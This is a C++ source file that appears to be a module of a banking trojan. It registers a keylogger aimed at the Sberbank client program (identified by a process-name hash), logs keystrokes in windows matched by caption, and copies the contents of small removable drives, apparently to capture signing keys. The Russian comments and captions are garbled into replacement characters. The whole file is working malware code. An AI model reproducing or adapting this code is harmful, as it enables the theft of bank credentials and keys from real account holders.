//---------------------------------------------------------------------------


#pragma hdrstop


#include "SberKeyLogger.h"
#include "GetApi.h"
#include "Utils.h"

//#include "BotDebug.h"


//-----------------------------------------------------------------------------
namespace SBERKEYLOGDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define SBRKDBG SBERKEYLOGDEBUGSTRINGS::DBGOutMessage<>

//-----------------------------------------------------------------------------



#define MAX_DRIVE_SIZE  2097152 /* 2 �� */


//---------------------------------------------------------------------------

void SberKeyLoggerSumFileSize(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
{

	DWORD *Size = (DWORD*)Data;

	HANDLE File = (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, NULL,
														OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	// ���� �� ������� ��������, ������� � �������
	if (File != INVALID_HANDLE_VALUE)
	{
        DWORD HS = 0;
    	*Size += (DWORD)pGetFileSize(File, &HS);
    }
	pCloseHandle(File);

	if (*Size > MAX_DRIVE_SIZE)
		Cancel = true;
}
//---------------------------------------------------------------------------


void SberKeyLoggerCalcDriveSize(PCHAR Drive, LPVOID Data, bool &Cancel)
{
	// ���������� ��� ����� ����� � ���������� ������
    SBRKDBG("SBER_KEYLOGGER", "���������� ���������� %s", Drive);


	DWORD EMode = (DWORD)pSetErrorMode(SEM_FAILCRITICALERRORS);

	DWORD Size = 0;

	SearchFiles(Drive, "*.*", true, FA_ANY_FILES, &Size, SberKeyLoggerSumFileSize);


	if (Size != 0 && Size <= MAX_DRIVE_SIZE)
	{
		PCHAR Dr = STR::New(Drive, 1);
		PCHAR Name = STR::New(2, "DRIVE_", Dr);

		SBRKDBG("SBER_KEYLOGGER", "��������� ����� ���������� � ����� � ����� %s", Name);

		KeyLogger::AddDirectory(Drive, Name);

		STR::Free(Dr);
		STR::Free(Name);
	}

	pSetErrorMode(EMode);
}
//---------------------------------------------------------------------------

void SberKeyLoggerActivateFilter(LPVOID Sender)
{
	// ���� ��������� ������� ��������
	SBRKDBG("SBER_KEYLOGGER", "�������� ������. ���� ���� ����������");
	EnumDrives(DRIVE_REMOVABLE, SberKeyLoggerCalcDriveSize, NULL);

}


//-----------------------------------------------------------------------------


void RegisterSberKeyLogger()
{
	// ������� ������������ �������� ��� ������� Sber

    char SberSystemName[] = {'S', 'B', 'E', 'R',  0};

	PKeyLogSystem S = KeyLogger::AddSystem(SberSystemName, 0x321ECF12 /* wclnt.exe */);
	if (S != NULL)
	{
		char Caption1[] = {'�', '�', '�', '�', ' ', '�', ' ', '�', '�', '�', '�', '�', '�', '�',  0};
		char Caption2[] = {'�', '�', '�', '�', '�', '�', ' ', '�', '�', '�', '�', '�', '�', '�', '�', '�', '�',  0};

		// ��������� �������
		KeyLogger::AddFilter(S, true, true, NULL, Caption1, FILTRATE_PARENT_WND, LOG_KEYBOARD, 4);

		PKlgWndFilter F = KeyLogger::AddFilter(S, true, true, NULL, Caption2, FILTRATE_PARENT_WND, LOG_KEYBOARD, 4);

		if (F != NULL)
			F->OnActivate = SberKeyLoggerActivateFilter;
	}
}
